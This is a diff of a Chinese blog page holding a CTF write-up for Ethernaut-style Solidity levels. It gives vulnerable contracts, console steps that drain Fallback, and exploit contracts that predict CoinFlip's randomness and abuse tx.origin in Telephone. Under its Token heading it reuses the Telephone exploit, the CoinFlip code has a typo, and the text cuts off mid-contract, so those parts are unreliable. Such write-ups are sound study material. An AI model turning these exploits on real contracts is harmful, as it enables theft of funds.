@@ -1,44 +1,44 @@
-<!DOCTYPE html><html lang="zh-Hans" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>以太航员挑战 | 沉于思，录以隙</title><meta name="description" content="# 控制台用法 await contract：显示当前关卡所有可用方法 看slot内容 ```solidity await web3.eth.getStorageAt(&#34;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&#34;, 0) ``` DEX"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/_astro/_folder_.k9dOAKhk.css"></head> <body class="is-post-page"> <div class="deep-space-container" id="deep-space-bg" aria-hidden="true" data-astro-cid-nnyeyk4f> <div class="ds-nebula" data-astro-cid-nnyeyk4f></div> <canvas class="ds-stars" id="ds-canvas" data-astro-cid-nnyeyk4f></canvas> <div class="ds-grid" data-astro-cid-nnyeyk4f></div> <div class="ds-noise" data-astro-cid-nnyeyk4f></div> </div> <script type="module">let r;function o(){const e=document.getElementById("ds-canvas");if(!e)return;const i=e.getContext("2d");if(!i)return;let a=e.width=window.innerWidth,n=e.height=window.innerHeight,h=Array.from({length:250},()=>({x:Math.random()*a,y:Math.random()*n,z:Math.random()*2+.1,opacity:Math.random()*.8+.1,pulse:Math.random()*.01,pulseDir:Math.random()>.5?1:-1}));r&&cancelAnimationFrame(r);const d=()=>{i.clearRect(0,0,a,n),h.forEach(t=>{t.opacity+=t.pulse*t.pulseDir;const c=.8;t.opacity>=c&&(t.opacity=c,t.pulseDir=-1),t.opacity<=.05&&(t.opacity=.05,t.pulseDir=1),i.fillStyle=`rgba(226, 232, 240, ${t.opacity})`,i.beginPath(),i.arc(t.x,t.y,t.z*.9,0,Math.PI*2),i.fill(),t.x-=.15/t.z,t.y-=.05/t.z,t.x<0&&(t.x=a),t.y<0&&(t.y=n)}),r=requestAnimationFrame(d)};d(),window.addEventListener("resize",()=>{a=e.width=window.innerWidth,n=e.height=window.innerHeight})}document.addEventListener("astro:page-load",o);document.readyState==="complete"?o():window.addEventListener("load",o);</script>  <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero"> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">web3</p> <h1 class="post-cover-hero__title">以太航员挑战</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">合约审计</span>  </div> <div class="article-meta-row"> <span>2026/3/16</span> <span>web3</span> <span>web3 · 合约审计</span> </div> <div class="tag-row article-header__tags"> <a href="/tags/web3/" class="tag">#web3</a><a href="/tags/合约审计/" class="tag">#合约审计</a> </div> <p class="source-note">来源路径：web3/合约审计/以太航员挑战.md</p> </header> <div class="article-main"> <div class="article-content"><h1>控制台用法</h1><p>await contract：显示当前关卡所有可用方法</p>
+<!DOCTYPE html><html lang="zh-Hans" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>以太航员挑战 | 沉于思，录以隙</title><meta name="description" content="# 控制台用法 await contract：显示当前关卡所有可用方法 看slot内容 ```solidity await web3.eth.getStorageAt(&#34;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&#34;, 0) ``` DEX"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/styles/github-dark.min.css"><link rel="stylesheet" href="/_astro/_folder_.k9dOAKhk.css"></head> <body class="is-post-page"> <div class="deep-space-container" id="deep-space-bg" aria-hidden="true" data-astro-cid-nnyeyk4f> <div class="ds-nebula" data-astro-cid-nnyeyk4f></div> <canvas class="ds-stars" id="ds-canvas" data-astro-cid-nnyeyk4f></canvas> <div class="ds-grid" data-astro-cid-nnyeyk4f></div> <div class="ds-noise" data-astro-cid-nnyeyk4f></div> </div> <script type="module">let r;function o(){const e=document.getElementById("ds-canvas");if(!e)return;const i=e.getContext("2d");if(!i)return;let a=e.width=window.innerWidth,n=e.height=window.innerHeight,h=Array.from({length:250},()=>({x:Math.random()*a,y:Math.random()*n,z:Math.random()*2+.1,opacity:Math.random()*.8+.1,pulse:Math.random()*.01,pulseDir:Math.random()>.5?1:-1}));r&&cancelAnimationFrame(r);const d=()=>{i.clearRect(0,0,a,n),h.forEach(t=>{t.opacity+=t.pulse*t.pulseDir;const c=.8;t.opacity>=c&&(t.opacity=c,t.pulseDir=-1),t.opacity<=.05&&(t.opacity=.05,t.pulseDir=1),i.fillStyle=`rgba(226, 232, 240, ${t.opacity})`,i.beginPath(),i.arc(t.x,t.y,t.z*.9,0,Math.PI*2),i.fill(),t.x-=.15/t.z,t.y-=.05/t.z,t.x<0&&(t.x=a),t.y<0&&(t.y=n)}),r=requestAnimationFrame(d)};d(),window.addEventListener("resize",()=>{a=e.width=window.innerWidth,n=e.height=window.innerHeight})}document.addEventListener("astro:page-load",o);document.readyState==="complete"?o():window.addEventListener("load",o);</script>  <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero"> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">web3</p> <h1 class="post-cover-hero__title">以太航员挑战</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">合约审计</span>  </div> <div class="article-meta-row"> <span>2026/3/16</span> <span>web3</span> <span>web3 · 合约审计</span> </div> <div class="tag-row article-header__tags"> <a href="/tags/web3/" class="tag">#web3</a><a href="/tags/合约审计/" class="tag">#合约审计</a> </div> <p class="source-note">来源路径：web3/合约审计/以太航员挑战.md</p> </header> <div class="article-main"> <div class="article-content"><h1>控制台用法</h1><p>await contract：显示当前关卡所有可用方法</p>
 <p>看slot内容</p>
-<pre><code class="language-solidity">await web3.eth.getStorageAt(&quot;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&quot;, 0)
+<pre><code class="language-solidity"><span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&quot;</span>, <span class="hljs-number">0</span>)
 </code></pre>
 <p>DEX关卡较多使用控制台，可参考</p>
-<h1>fallback</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>fallback</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Fallback {
-    mapping(address =&gt; uint256) public contributions;
-    address public owner;
+contract <span class="hljs-title class_">Fallback</span> {
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) <span class="hljs-keyword">public</span> contributions;
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor() {
-        owner = msg.sender;
-        contributions[msg.sender] = 1000 * (1 ether);
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
+        owner = msg.<span class="hljs-property">sender</span>;
+        contributions[msg.<span class="hljs-property">sender</span>] = <span class="hljs-number">1000</span> * (<span class="hljs-number">1</span> ether);
     }
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, &quot;caller is not the owner&quot;);
+    modifier <span class="hljs-title function_">onlyOwner</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == owner, <span class="hljs-string">&quot;caller is not the owner&quot;</span>);
         _;
     }
 
-    function contribute() public payable {
-        require(msg.value &lt; 0.001 ether);
-        contributions[msg.sender] += msg.value;
-        if (contributions[msg.sender] &gt; contributions[owner]) {
-            owner = msg.sender;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">contribute</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> &lt; <span class="hljs-number">0.001</span> ether);
+        contributions[msg.<span class="hljs-property">sender</span>] += msg.<span class="hljs-property">value</span>;
+        <span class="hljs-keyword">if</span> (contributions[msg.<span class="hljs-property">sender</span>] &gt; contributions[owner]) {
+            owner = msg.<span class="hljs-property">sender</span>;
         }
     }
 
-    function getContribution() public view returns (uint256) {
-        return contributions[msg.sender];
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getContribution</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">return</span> contributions[msg.<span class="hljs-property">sender</span>];
     }
 
-    function withdraw() public onlyOwner {
-        payable(owner).transfer(address(this).balance);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> onlyOwner {
+        <span class="hljs-title function_">payable</span>(owner).<span class="hljs-title function_">transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span>);
     }
 
-    receive() external payable {
-        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
-        owner = msg.sender;
+    <span class="hljs-title function_">receive</span>() external payable {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> &gt; <span class="hljs-number">0</span> &amp;&amp; contributions[msg.<span class="hljs-property">sender</span>] &gt; <span class="hljs-number">0</span>);
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 }
 </code></pre>
@@ -50,9 +50,9 @@ contract Fallback {
 <li><code>withdraw()</code>：只有 <code>owner</code> 可调用，把合约所有余额发给 <code>owner</code>（使用 <code>.transfer</code>）。</li>
 <li><code>receive()</code>：合约接收到直接转账（无 calldata）时执行；要求 <code>msg.value &gt; 0</code> 且 <code>contributions[msg.sender] &gt; 0</code>，然后把 <code>owner = msg.sender</code>。</li>
 </ul>
-<h2 id="section-1">思路</h2><pre><code class="language-solidity">contract.contribute({value: 1}) //首先使贡献值大于0
-contract.sendTransaction({value: 1}) //触发receive函数
-contract.withdraw() //将合约的balance清零
+<h2 id="section-1">思路</h2><pre><code class="language-solidity">contract.<span class="hljs-title function_">contribute</span>({<span class="hljs-attr">value</span>: <span class="hljs-number">1</span>}) <span class="hljs-comment">//首先使贡献值大于0</span>
+contract.<span class="hljs-title function_">sendTransaction</span>({<span class="hljs-attr">value</span>: <span class="hljs-number">1</span>}) <span class="hljs-comment">//触发receive函数</span>
+contract.<span class="hljs-title function_">withdraw</span>() <span class="hljs-comment">//将合约的balance清零</span>
 </code></pre>
 <p>关键在receive函数，</p>
 <p>EVM 如何用 calldata 判断调用哪个函数？</p>
@@ -69,135 +69,135 @@ contract.withdraw() //将合约的balance清零
 </li>
 </ol>
 <p>这就是为什么：</p>
-<pre><code class="language-solidity">contract.contribute({value: 1})
+<pre><code class="language-solidity">contract.<span class="hljs-title function_">contribute</span>({<span class="hljs-attr">value</span>: <span class="hljs-number">1</span>})
 </code></pre>
 <p>会执行 <code>contribute()</code>（因为有匹配的函数选择器），<br>而</p>
-<pre><code class="language-solidity">signer.sendTransaction({to: contract.address, value: 1})
+<pre><code class="language-solidity">signer.<span class="hljs-title function_">sendTransaction</span>({<span class="hljs-attr">to</span>: contract.<span class="hljs-property">address</span>, <span class="hljs-attr">value</span>: <span class="hljs-number">1</span>})
 </code></pre>
 <p>没有任何 calldata（data 字段为空），于是触发了 <code>receive()</code>。</p>
-<h1>fallout</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+<h1>fallout</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
 
-import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;</span>;
 
-contract Fallout {
-    using SafeMath for uint256;
-//把  SafeMath  库里所有 以 uint256 作为第一个参数 的函数，“挂”到  uint256  类型
-之后写  x.add(y)  就能自动转成  SafeMath.add(x, y) ，防止加减乘除溢出。
+contract <span class="hljs-title class_">Fallout</span> {
+    <span class="hljs-keyword">using</span> <span class="hljs-title class_">SafeMath</span> <span class="hljs-keyword">for</span> uint256;
+<span class="hljs-comment">//把  SafeMath  库里所有 以 uint256 作为第一个参数 的函数，“挂”到  uint256  类型</span>
+之后写  x.<span class="hljs-title function_">add</span>(y)  就能自动转成  <span class="hljs-title class_">SafeMath</span>.<span class="hljs-title function_">add</span>(x, y) ，防止加减乘除溢出。
 
-    mapping(address =&gt; uint256) allocations;
-    address payable public owner;
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) allocations;
+    address payable <span class="hljs-keyword">public</span> owner;
 
-    /* constructor */
-    function Fal1out() public payable {
-        owner = msg.sender;
-        allocations[owner] = msg.value;
+    <span class="hljs-comment">/* constructor */</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Fal1out</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable {
+        owner = msg.<span class="hljs-property">sender</span>;
+        allocations[owner] = msg.<span class="hljs-property">value</span>;
     }
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, &quot;caller is not the owner&quot;);
+    modifier <span class="hljs-title function_">onlyOwner</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == owner, <span class="hljs-string">&quot;caller is not the owner&quot;</span>);
         _;
     }
 
-    function allocate() public payable {
-        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable {
+        allocations[msg.<span class="hljs-property">sender</span>] = allocations[msg.<span class="hljs-property">sender</span>].<span class="hljs-title function_">add</span>(msg.<span class="hljs-property">value</span>);
     }
 
-    function sendAllocation(address payable allocator) public {
-        require(allocations[allocator] &gt; 0);
-        allocator.transfer(allocations[allocator]);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendAllocation</span>(<span class="hljs-params">address payable allocator</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>(allocations[allocator] &gt; <span class="hljs-number">0</span>);
+        allocator.<span class="hljs-title function_">transfer</span>(allocations[allocator]);
     }
 
-    function collectAllocations() public onlyOwner {
-        msg.sender.transfer(address(this).balance);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">collectAllocations</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> onlyOwner {
+        msg.<span class="hljs-property">sender</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span>);
     }
 
-    function allocatorBalance(address allocator) public view returns (uint256) {
-        return allocations[allocator];
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">allocatorBalance</span>(<span class="hljs-params">address allocator</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">return</span> allocations[allocator];
     }
 }
 </code></pre>
 <p>该关卡的要求是获取合约的owner</p>
-<pre><code class="language-solidity">    /* constructor */
-    function Fal1out() public payable {
-        owner = msg.sender;
-        allocations[owner] = msg.value;
+<pre><code class="language-solidity">    <span class="hljs-comment">/* constructor */</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Fal1out</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable {
+        owner = msg.<span class="hljs-property">sender</span>;
+        allocations[owner] = msg.<span class="hljs-property">value</span>;
     }
 </code></pre>
 <p>构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。</p>
-<h1>CoinFlip</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>CoinFlip</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract CoinFlip {
-    uint256 public consecutiveWins;
+contract <span class="hljs-title class_">CoinFlip</span> {
+    uint256 <span class="hljs-keyword">public</span> consecutiveWins;
     uint256 lastHash;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 <span class="hljs-variable constant_">FACTOR</span> = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
 
-    constructor() {
-        consecutiveWins = 0;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
+        consecutiveWins = <span class="hljs-number">0</span>;
     }
 
-    function flip(bool _guess) public returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">flip</span>(<span class="hljs-params">bool _guess</span>) <span class="hljs-keyword">public</span> <span class="hljs-title function_">returns</span> (bool) {
+        uint256 blockValue = <span class="hljs-title function_">uint256</span>(<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>));
 
-        if (lastHash == blockValue) {
-            revert();
+        <span class="hljs-keyword">if</span> (lastHash == blockValue) {
+            <span class="hljs-title function_">revert</span>();
         }
 
         lastHash = blockValue;
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlaip == 1 ? true : false;
+        uint256 coinFlip = blockValue / <span class="hljs-variable constant_">FACTOR</span>;
+        bool side = coinFlaip == <span class="hljs-number">1</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;
 
-        if (side == _guess) {
+        <span class="hljs-keyword">if</span> (side == _guess) {
             consecutiveWins++;
-            return true;
-        } else {
-            consecutiveWins = 0;
-            return false;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        } <span class="hljs-keyword">else</span> {
+            consecutiveWins = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
         }
     }
 }
 </code></pre>
 <p>抛硬币 游戏合约，<br>游戏逻辑（理想版）<br>用上一区块的哈希  blockhash(block.number-1)  做随机源<br>哈希除以一个大数  FACTOR ，把最高位挤出来当 0/1<br>猜对了  consecutiveWins++ ，猜错清零</p>
 <p>但是blockhash可预测</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &#39;./CoinFlip.sol&#39;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./CoinFlip.sol&#x27;</span>;
 
-contract Hack {
-    CoinFlip public immutable target;
-    uint256 private constant FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+contract <span class="hljs-title class_">Hack</span> {
+    <span class="hljs-title class_">CoinFlip</span> <span class="hljs-keyword">public</span> immutable target;
+    uint256 <span class="hljs-keyword">private</span> constant <span class="hljs-variable constant_">FACTOR</span> =
+        <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
 
-    constructor(address _target) {
-        target = CoinFlip(_target);
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _target</span>) {
+        target = <span class="hljs-title class_">CoinFlip</span>(_target);
     }
 
-    /// 必须在新区块里调用，否则 revert
-    function attack() external {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        require(blockValue != 0, &quot;block too early&quot;);
+    <span class="hljs-comment">/// 必须在新区块里调用，否则 revert</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>) external {
+        uint256 blockValue = <span class="hljs-title function_">uint256</span>(<span class="hljs-title function_">blockhash</span>(block.<span class="hljs-property">number</span> - <span class="hljs-number">1</span>));
+        <span class="hljs-built_in">require</span>(blockValue != <span class="hljs-number">0</span>, <span class="hljs-string">&quot;block too early&quot;</span>);
 
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1;
+        uint256 coinFlip = blockValue / <span class="hljs-variable constant_">FACTOR</span>;
+        bool side = coinFlip == <span class="hljs-number">1</span>;
 
-        target.flip(side);          // 百发百中
+        target.<span class="hljs-title function_">flip</span>(side);          <span class="hljs-comment">// 百发百中</span>
     }
 }
 </code></pre>
-<h1>Telephone</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>Telephone</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Telephone {
-    address public owner;
+contract <span class="hljs-title class_">Telephone</span> {
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor() {
-        owner = msg.sender;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 
-    function changeOwner(address _owner) public {
-        if (tx.origin != msg.sender) {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">changeOwner</span>(<span class="hljs-params">address _owner</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-keyword">if</span> (tx.<span class="hljs-property">origin</span> != msg.<span class="hljs-property">sender</span>) {
             owner = _owner;
         }
     }
@@ -209,104 +209,104 @@ contract Telephone {
 <li><code>msg.sender</code> 是当前调用者（可能是合约或外部账户）。</li>
 </ul>
 <p>如果情景是直接由钱包调用合约，两者相同  ，但是如果是在多个合约的情况下，比如用户通过b合约来调用a合约，那么对于a合约来说，msg.sender就代表合约b，而tx.origin就代表用户钱包地址，所以我们这里需要另外部署一个合约来调用这儿的changeOwner：</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &#39;./Telephone.sol&#39;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./Telephone.sol&#x27;</span>;
 
 contract exp{
-    Telephone public immutable target;
-    address public owner;
+    <span class="hljs-title class_">Telephone</span> <span class="hljs-keyword">public</span> immutable target;
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor(){
-        owner = msg.sender;
-  //在 Solidity 中，`msg.sender` 表示当前调用这个函数的实体；
- //所以这里 `msg.sender
-//会是你的钱包地址；因此构造函数执行时，将部署者地址写入 owner
-        target=Telephone(0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9);//目标合约地址
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>){
+        owner = msg.<span class="hljs-property">sender</span>;
+  <span class="hljs-comment">//在 Solidity 中，`msg.sender` 表示当前调用这个函数的实体；</span>
+ <span class="hljs-comment">//所以这里 `msg.sender</span>
+<span class="hljs-comment">//会是你的钱包地址；因此构造函数执行时，将部署者地址写入 owner</span>
+        target=<span class="hljs-title class_">Telephone</span>(<span class="hljs-number">0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9</span>);<span class="hljs-comment">//目标合约地址</span>
     }
 
-    function attack() public {
-        target.changeOwner(owner);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        target.<span class="hljs-title function_">changeOwner</span>(owner);
     }
 
 }
 </code></pre>
-<h1>Token 整数溢出</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+<h1>Token 整数溢出</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
 
-contract Token {
-    mapping(address =&gt; uint256) balances;
-    uint256 public totalSupply;
+contract <span class="hljs-title class_">Token</span> {
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) balances;
+    uint256 <span class="hljs-keyword">public</span> totalSupply;
 
-    constructor(uint256 _initialSupply) public {
-        balances[msg.sender] = totalSupply = _initialSupply;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">uint256 _initialSupply</span>) <span class="hljs-keyword">public</span> {
+        balances[msg.<span class="hljs-property">sender</span>] = totalSupply = _initialSupply;
     }
 
-    function transfer(address _to, uint256 _value) public returns (bool) {
-        require(balances[msg.sender] - _value &gt;= 0);
-        balances[msg.sender] -= _value;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">address _to, uint256 _value</span>) <span class="hljs-keyword">public</span> <span class="hljs-title function_">returns</span> (bool) {
+        <span class="hljs-built_in">require</span>(balances[msg.<span class="hljs-property">sender</span>] - _value &gt;= <span class="hljs-number">0</span>);
+        balances[msg.<span class="hljs-property">sender</span>] -= _value;
         balances[_to] += _value;
-        return true;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
     }
 
-    function balanceOf(address _owner) public view returns (uint256 balance) {
-        return balances[_owner];
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address _owner</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256 balance) {
+        <span class="hljs-keyword">return</span> balances[_owner];
     }
 }
 </code></pre>
 <p>整数溢出因为是uint的，负数就直接是下溢了。</p>
 <p>转账地址随便填就行，只要不是自己就行，否则就加一次减一次回来了。</p>
 <p>查看自己的余额await contract.balanceOf(player)).toNumber()</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &#39;./Telephone.sol&#39;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./Telephone.sol&#x27;</span>;
 
 
 
 contract exp{
-    Telephone public immutable target;
-    address public owner;
+    <span class="hljs-title class_">Telephone</span> <span class="hljs-keyword">public</span> immutable target;
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor(){
-        owner = msg.sender;
-        target=Telephone(0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9);//目标合约地址
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>){
+        owner = msg.<span class="hljs-property">sender</span>;
+        target=<span class="hljs-title class_">Telephone</span>(<span class="hljs-number">0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9</span>);<span class="hljs-comment">//目标合约地址</span>
     }
 
-    function attack() public {
-        target.changeOwner(owner);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        target.<span class="hljs-title function_">changeOwner</span>(owner);
     }
 }
 </code></pre>
-<h1>Delegation 代理机制</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>Delegation 代理机制</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Delegate {
-    address public owner;
+contract <span class="hljs-title class_">Delegate</span> {
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor(address _owner) {
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _owner</span>) {
         owner = _owner;
     }
 
-    function pwn() public {
-        owner = msg.sender;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 }
 
-contract Delegation {
-    address public owner;
-    Delegate delegate;
+contract <span class="hljs-title class_">Delegation</span> {
